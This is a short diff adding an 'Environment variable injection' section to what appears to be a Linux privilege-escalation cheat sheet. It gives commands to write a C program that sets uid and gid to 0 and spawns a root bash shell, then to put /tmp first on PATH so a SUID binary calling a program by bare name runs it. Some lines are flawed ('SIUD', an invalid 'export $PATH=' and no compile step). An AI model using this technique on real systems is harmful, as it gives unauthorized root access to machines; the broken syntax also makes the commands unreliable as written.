@@ -123,3 +123,14 @@ void inject(){
 }
 ```
 
+## Environment variable injection
+
+### If you find a file without full path and having SIUD bit set, create this c file,
+```
+echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
+```
+
+### Set environment path to /tmp
+```
+export $PATH=/tmp:$PATH
+```
